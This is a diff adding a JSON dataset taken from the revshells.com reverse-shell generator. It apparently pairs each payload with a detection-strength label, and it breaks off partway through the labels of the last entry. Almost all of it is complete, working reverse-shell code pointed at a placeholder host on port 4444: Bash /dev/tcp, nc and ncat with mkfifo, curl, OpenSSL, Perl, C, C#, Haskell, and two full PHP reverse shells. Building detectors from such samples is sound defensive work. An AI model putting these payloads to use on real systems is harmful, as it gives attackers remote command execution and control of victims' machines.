@@ -1,0 +1,3998 @@
+{
+ "source": "Reverse Shell Generator (revshells.com) js/data.js",
+ "url": "https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js",
+ "commit": "9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6",
+ "license": "MIT",
+ "license_text": "MIT License\n\nCopyright (c) 2022 Ryan Montgomery\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.",
+ "substitutions": {
+  "{ip}": "203.0.113.7",
+  "{port}": "4444",
+  "{shell}": "sh (cmd for Windows-only entries)"
+ },
+ "sections": [
+  "ReverseShell",
+  "BindShell",
+  "MSFVenom"
+ ],
+ "entries": [
+  {
+   "name": "Bash -i",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "sh -i >& /dev/tcp/203.0.113.7/4444 0>&1"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Bash 196",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "0<&196;exec 196<>/dev/tcp/203.0.113.7/4444; sh <&196 >&196 2>&196"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Bash read line",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "exec 5<>/dev/tcp/203.0.113.7/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "Bash 5",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "sh -i 5<> /dev/tcp/203.0.113.7/4444 0<&5 1>&5 2>&5"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Bash udp",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "sh -i >& /dev/udp/203.0.113.7/4444 0>&1"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "nc mkfifo",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 203.0.113.7 4444 >/tmp/f"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "nc -e",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "nc 203.0.113.7 4444 -e sh"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "nc.exe -e",
+   "section": "ReverseShell",
+   "meta": [
+    "windows"
+   ],
+   "lines": [
+    "nc.exe 203.0.113.7 4444 -e cmd"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "BusyBox nc -e",
+   "section": "ReverseShell",
+   "meta": [
+    "linux"
+   ],
+   "lines": [
+    "busybox nc 203.0.113.7 4444 -e sh"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "nc -c",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "nc -c sh 203.0.113.7 4444"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "ncat -e",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "ncat 203.0.113.7 4444 -e sh"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "ncat.exe -e",
+   "section": "ReverseShell",
+   "meta": [
+    "windows"
+   ],
+   "lines": [
+    "ncat.exe 203.0.113.7 4444 -e cmd"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "ncat udp",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 203.0.113.7 4444 >/tmp/f"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "curl",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "C='curl -Ns telnet://203.0.113.7:4444'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "rustcat",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "rcat connect -s sh 203.0.113.7 4444"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "C",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "#include <stdio.h>",
+    "#include <sys/socket.h>",
+    "#include <sys/types.h>",
+    "#include <stdlib.h>",
+    "#include <unistd.h>",
+    "#include <netinet/in.h>",
+    "#include <arpa/inet.h>",
+    "int main(void){",
+    "    int port = 4444;",
+    "    struct sockaddr_in revsockaddr;",
+    "    int sockt = socket(AF_INET, SOCK_STREAM, 0);",
+    "    revsockaddr.sin_family = AF_INET;       ",
+    "    revsockaddr.sin_port = htons(port);",
+    "    revsockaddr.sin_addr.s_addr = inet_addr(\"203.0.113.7\");",
+    "    connect(sockt, (struct sockaddr *) &revsockaddr, ",
+    "    sizeof(revsockaddr));",
+    "    dup2(sockt, 0);",
+    "    dup2(sockt, 1);",
+    "    dup2(sockt, 2);",
+    "    char * const argv[] = {\"sh\", NULL};",
+    "    execvp(\"sh\", argv);",
+    "    return 0;       ",
+    "}"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "C Windows",
+   "section": "ReverseShell",
+   "meta": [
+    "windows"
+   ],
+   "lines": [
+    "#include <winsock2.h>",
+    "#include <stdio.h>",
+    "#pragma comment(lib,\"ws2_32\")",
+    "WSADATA wsaData;",
+    "SOCKET Winsock;",
+    "struct sockaddr_in hax; ",
+    "char ip_addr[16] = \"203.0.113.7\"; ",
+    "char port[6] = \"4444\";            ",
+    "STARTUPINFO ini_processo;",
+    "PROCESS_INFORMATION processo_info;",
+    "int main()",
+    "{",
+    "    WSAStartup(MAKEWORD(2, 2), &wsaData);",
+    "    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);",
+    "    struct hostent *host; ",
+    "    host = gethostbyname(ip_addr);",
+    "    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));",
+    "    hax.sin_family = AF_INET;",
+    "    hax.sin_port = htons(atoi(port));",
+    "    hax.sin_addr.s_addr = inet_addr(ip_addr);",
+    "    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);",
+    "    memset(&ini_processo, 0, sizeof(ini_processo));",
+    "    ini_processo.cb = sizeof(ini_processo);",
+    "    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; ",
+    "    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;",
+    "    TCHAR cmd[255] = TEXT(\"cmd.exe\");",
+    "    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);",
+    "    return 0;",
+    "}"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "C# TCP Client",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows"
+   ],
+   "lines": [
+    "using System;",
+    "using System.Text;",
+    "using System.IO;",
+    "using System.Diagnostics;",
+    "using System.ComponentModel;",
+    "using System.Linq;",
+    "using System.Net;",
+    "using System.Net.Sockets;",
+    "namespace ConnectBack",
+    "{",
+    "\tpublic class Program",
+    "\t{",
+    "\t\tstatic StreamWriter streamWriter;",
+    "\t\tpublic static void Main(string[] args)",
+    "\t\t{",
+    "\t\t\tusing(TcpClient client = new TcpClient(\"203.0.113.7\", 4444))",
+    "\t\t\t{",
+    "\t\t\t\tusing(Stream stream = client.GetStream())",
+    "\t\t\t\t{",
+    "\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))",
+    "\t\t\t\t\t{",
+    "\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);",
+    "\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();",
+    "\t\t\t\t\t\tProcess p = new Process();",
+    "\t\t\t\t\t\tp.StartInfo.FileName = \"sh\";",
+    "\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;",
+    "\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;",
+    "\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;",
+    "\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;",
+    "\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;",
+    "\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);",
+    "\t\t\t\t\t\tp.Start();",
+    "\t\t\t\t\t\tp.BeginOutputReadLine();",
+    "\t\t\t\t\t\twhile(true)",
+    "\t\t\t\t\t\t{",
+    "\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());",
+    "\t\t\t\t\t\t\t//strInput.Append(\"\\n\");",
+    "\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);",
+    "\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);",
+    "\t\t\t\t\t\t}",
+    "\t\t\t\t\t}",
+    "\t\t\t\t}",
+    "\t\t\t}",
+    "\t\t}",
+    "\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)",
+    "        {",
+    "            StringBuilder strOutput = new StringBuilder();",
+    "            if (!String.IsNullOrEmpty(outLine.Data))",
+    "            {",
+    "                try",
+    "                {",
+    "                    strOutput.Append(outLine.Data);",
+    "                    streamWriter.WriteLine(strOutput);",
+    "                    streamWriter.Flush();",
+    "                }",
+    "                catch (Exception err) { }",
+    "            }",
+    "        }",
+    "\t}",
+    "}"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "C# Bash -i",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows"
+   ],
+   "lines": [
+    "using System;",
+    "using System.Diagnostics;",
+    "namespace BackConnect {",
+    "  class ReverseBash {",
+    "\tpublic static void Main(string[] args) {",
+    "\t  Process proc = new System.Diagnostics.Process();",
+    "\t  proc.StartInfo.FileName = \"sh\";",
+    "\t  proc.StartInfo.Arguments = \"-c \\\"sh -i >& /dev/tcp/203.0.113.7/4444 0>&1\\\"\";",
+    "\t  proc.StartInfo.UseShellExecute = false;",
+    "\t  proc.StartInfo.RedirectStandardOutput = true;",
+    "\t  proc.Start();",
+    "\t  while (!proc.StandardOutput.EndOfStream) {",
+    "\t\tConsole.WriteLine(proc.StandardOutput.ReadLine());",
+    "\t  }",
+    "\t}",
+    "  }",
+    "}"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "strong",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Haskell #1",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "module Main where",
+    "import System.Process",
+    "main = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc 203.0.113.7 4444 >/tmp/f\""
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "strong"
+   ]
+  },
+  {
+   "name": "OpenSSL",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 203.0.113.7:4444 > /tmp/s; rm /tmp/s"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Perl",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "perl -e 'use Socket;$i=\"203.0.113.7\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Perl no sh",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"203.0.113.7:4444\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "PHP PentestMonkey",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows",
+    "mac"
+   ],
+   "lines": [
+    "<?php",
+    "// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php",
+    "// Copyright (C) 2007 pentestmonkey@pentestmonkey.net",
+    "set_time_limit (0);",
+    "$VERSION = \"1.0\";",
+    "$ip = '203.0.113.7';",
+    "$port = 4444;",
+    "$chunk_size = 1400;",
+    "$write_a = null;",
+    "$error_a = null;",
+    "$shell = 'uname -a; w; id; sh -i';",
+    "$daemon = 0;",
+    "$debug = 0;",
+    "if (function_exists('pcntl_fork')) {",
+    "\t$pid = pcntl_fork();",
+    "\tif ($pid == -1) {",
+    "\t\tprintit(\"ERROR: Can't fork\");",
+    "\t\texit(1);",
+    "\t}",
+    "\tif ($pid) {",
+    "\t\texit(0);  // Parent exits",
+    "\t}",
+    "\tif (posix_setsid() == -1) {",
+    "\t\tprintit(\"Error: Can't setsid()\");",
+    "\t\texit(1);",
+    "\t}",
+    "\t$daemon = 1;",
+    "} else {",
+    "\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");",
+    "}",
+    "chdir(\"/\");",
+    "umask(0);",
+    "// Open reverse connection",
+    "$sock = fsockopen($ip, $port, $errno, $errstr, 30);",
+    "if (!$sock) {",
+    "\tprintit(\"$errstr ($errno)\");",
+    "\texit(1);",
+    "}",
+    "$descriptorspec = array(",
+    "   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from",
+    "   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to",
+    "   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to",
+    ");",
+    "$process = proc_open($shell, $descriptorspec, $pipes);",
+    "if (!is_resource($process)) {",
+    "\tprintit(\"ERROR: Can't spawn shell\");",
+    "\texit(1);",
+    "}",
+    "stream_set_blocking($pipes[0], 0);",
+    "stream_set_blocking($pipes[1], 0);",
+    "stream_set_blocking($pipes[2], 0);",
+    "stream_set_blocking($sock, 0);",
+    "printit(\"Successfully opened reverse shell to $ip:$port\");",
+    "while (1) {",
+    "\tif (feof($sock)) {",
+    "\t\tprintit(\"ERROR: Shell connection terminated\");",
+    "\t\tbreak;",
+    "\t}",
+    "\tif (feof($pipes[1])) {",
+    "\t\tprintit(\"ERROR: Shell process terminated\");",
+    "\t\tbreak;",
+    "\t}",
+    "\t$read_a = array($sock, $pipes[1], $pipes[2]);",
+    "\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);",
+    "\tif (in_array($sock, $read_a)) {",
+    "\t\tif ($debug) printit(\"SOCK READ\");",
+    "\t\t$input = fread($sock, $chunk_size);",
+    "\t\tif ($debug) printit(\"SOCK: $input\");",
+    "\t\tfwrite($pipes[0], $input);",
+    "\t}",
+    "\tif (in_array($pipes[1], $read_a)) {",
+    "\t\tif ($debug) printit(\"STDOUT READ\");",
+    "\t\t$input = fread($pipes[1], $chunk_size);",
+    "\t\tif ($debug) printit(\"STDOUT: $input\");",
+    "\t\tfwrite($sock, $input);",
+    "\t}",
+    "\tif (in_array($pipes[2], $read_a)) {",
+    "\t\tif ($debug) printit(\"STDERR READ\");",
+    "\t\t$input = fread($pipes[2], $chunk_size);",
+    "\t\tif ($debug) printit(\"STDERR: $input\");",
+    "\t\tfwrite($sock, $input);",
+    "\t}",
+    "}",
+    "fclose($sock);",
+    "fclose($pipes[0]);",
+    "fclose($pipes[1]);",
+    "fclose($pipes[2]);",
+    "proc_close($process);",
+    "function printit ($string) {",
+    "\tif (!$daemon) {",
+    "\t\tprint \"$string\\n\";",
+    "\t}",
+    "}",
+    "?>"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "PHP Ivan Sincek",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows",
+    "mac"
+   ],
+   "lines": [
+    "<?php",
+    "// Copyright (c) 2020 Ivan Sincek",
+    "// v2.3",
+    "// Requires PHP v5.0.0 or greater.",
+    "// Works on Linux OS, macOS, and Windows OS.",
+    "// See the original script at https://github.com/pentestmonkey/php-reverse-shell.",
+    "class Shell {",
+    "    private $addr  = null;",
+    "    private $port  = null;",
+    "    private $os    = null;",
+    "    private $shell = null;",
+    "    private $descriptorspec = array(",
+    "        0 => array('pipe', 'r'), // shell can read from STDIN",
+    "        1 => array('pipe', 'w'), // shell can write to STDOUT",
+    "        2 => array('pipe', 'w')  // shell can write to STDERR",
+    "    );",
+    "    private $buffer  = 1024;    // read/write buffer size",
+    "    private $clen    = 0;       // command length",
+    "    private $error   = false;   // stream read/write error",
+    "    public function __construct($addr, $port) {",
+    "        $this->addr = $addr;",
+    "        $this->port = $port;",
+    "    }",
+    "    private function detect() {",
+    "        $detected = true;",
+    "        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS",
+    "            $this->os    = 'LINUX';",
+    "            $this->shell = 'sh';",
+    "        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {",
+    "            $this->os    = 'WINDOWS';",
+    "            $this->shell = 'cmd.exe';",
+    "        } else {",
+    "            $detected = false;",
+    "            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";",
+    "        }",
+    "        return $detected;",
+    "    }",
+    "    private function daemonize() {",
+    "        $exit = false;",
+    "        if (!function_exists('pcntl_fork')) {",
+    "            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";",
+    "        } else if (($pid = @pcntl_fork()) < 0) {",
+    "            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";",
+    "        } else if ($pid > 0) {",
+    "            $exit = true;",
+    "            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";",
+    "        } else if (posix_setsid() < 0) {",
+    "            // once daemonized you will actually no longer see the script's dump",
+    "            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";",
+    "        } else {",
+    "            echo \"DAEMONIZE: Completed successfully!\\n\";",
+    "        }",
+    "        return $exit;",
+    "    }",
+    "    private function settings() {",
+    "        @error_reporting(0);",
+    "        @set_time_limit(0); // do not impose the script execution time limit",
+    "        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories",
+    "    }",
+    "    private function dump($data) {",
+    "        $data = str_replace('<', '&lt;', $data);",
+    "        $data = str_replace('>', '&gt;', $data);",
+    "        echo $data;",
+    "    }",
+    "    private function read($stream, $name, $buffer) {",
+    "        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream",
+    "            $this->error = true;                            // set global error flag",
+    "            echo \"STRM_ERROR: Cannot read from ${name}, script will now exit...\\n\";",
+    "        }",
+    "        return $data;",
+    "    }",
+    "    private function write($stream, $name, $data) {",
+    "        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream",
+    "            $this->error = true;                            // set global error flag",
+    "            echo \"STRM_ERROR: Cannot write to ${name}, script will now exit...\\n\";",
+    "        }",
+    "        return $bytes;",
+    "    }",
+    "    // read/write method for non-blocking streams",
+    "    private function rw($input, $output, $iname, $oname) {",
+    "        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {",
+    "            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length",
+    "            $this->dump($data); // script's dump",
+    "        }",
+    "    }",
+    "    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)",
+    "    // we must read the exact byte length from a stream and not a single byte more",
+    "    private function brw($input, $output, $iname, $oname) {",
+    "        $fstat = fstat($input);",
+    "        $size = $fstat['size'];",
+    "        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {",
+    "            // for some reason Windows OS pipes STDIN into STDOUT",
+    "            // we do not like that",
+    "            // we need to discard the data from the stream",
+    "            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {",
+    "                $this->clen -= $bytes;",
+    "                $size -= $bytes;",
+    "            }",
+    "        }",
+    "        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {",
+    "            $size -= $bytes;",
+    "            $this->dump($data); // script's dump",
+    "        }",
+    "    }",
+    "    public function run() {",
+    "        if ($this->detect() && !$this->daemonize()) {",
+    "            $this->settings();",
+    "            // ----- SOCKET BEGIN -----",
+    "            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);",
+    "            if (!$socket) {",
+    "                echo \"SOC_ERROR: {$errno}: {$errstr}\\n\";",
+    "            } else {",
+    "                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS",
+    "                // ----- SHELL BEGIN -----",
+    "                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);",
+    "                if (!$process) {",
+    "                    echo \"PROC_ERROR: Cannot start the shell\\n\";",
+    "                } else {",
+    "                    foreach ($pipes as $pipe) {",
+    "                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS",
+    "                    }",
+    "                    // ----- WORK BEGIN -----",
+    "                    $status = proc_get_status($process);",
+    "                    @fwrite($socket, \"SOCKET: Shell has connected! PID: \" . $status['pid'] . \"\\n\");",
+    "                    do {",
+    "\t\t\t\t\t\t$status = proc_get_status($process);",
+    "                        if (feof($socket)) { // check for end-of-file on SOCKET",
+    "                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;",
+    "                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running",
+    "                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break; // feof() does not work with blocking streams",
+    "                        }                                                                    // use proc_get_status() instead",
+    "                        $streams = array(",
+    "                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR",
+    "                            'write'  => null,",
+    "                            'except' => null",
+    "                        );",
+    "                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS",
+    "                        if ($num_changed_streams === false) {",
+    "                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;",
+    "                        } else if ($num_changed_streams > 0) {",
+    "                            if ($this->os === 'LINUX') {",
+    "                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN",
+    "                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET",
+    "                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET",
+    "                            } else if ($this->os === 'WINDOWS') {",
+    "                                // order is important",
+    "                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN",
+    "                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET",
+    "                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET",
+    "                            }",
+    "                        }",
+    "                    } while (!$this->error);",
+    "                    // ------ WORK END ------",
+    "                    foreach ($pipes as $pipe) {",
+    "                        fclose($pipe);",
+    "                    }",
+    "                    proc_close($process);",
+    "                }",
+    "                // ------ SHELL END ------",
+    "                fclose($socket);",
+    "            }",
+    "            // ------ SOCKET END ------",
+    "        }",
+    "    }",
+    "}",
+    "echo '<pre>';",
+    "// change the host address and/or port number as necessary",
+    "$sh = new Shell('203.0.113.7', 4444);",
+    "$sh->run();",
+    "unset($sh);",
+    "// garbage collector requires PHP v5.3.0 or greater",
+    "// @gc_collect_cycles();",
+    "echo '</pre>';",
+    "?>"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
